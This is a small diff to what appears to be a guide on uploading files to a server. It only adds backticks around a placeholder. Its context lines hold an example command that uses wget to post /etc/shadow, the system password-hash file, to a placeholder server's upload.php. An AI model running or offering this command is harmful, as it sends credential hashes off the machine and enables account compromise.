@@ -30,4 +30,4 @@ To upload a file to the server, use the following method as an example:
 wget --post-file=/etc/shadow <server_ip>/upload.php?file=shadow
 ```
 
-Replace <server_ip> with the IP address of your server and adjust the file path as needed.
+Replace `<server_ip>` with the IP address of your server and adjust the file path as needed.
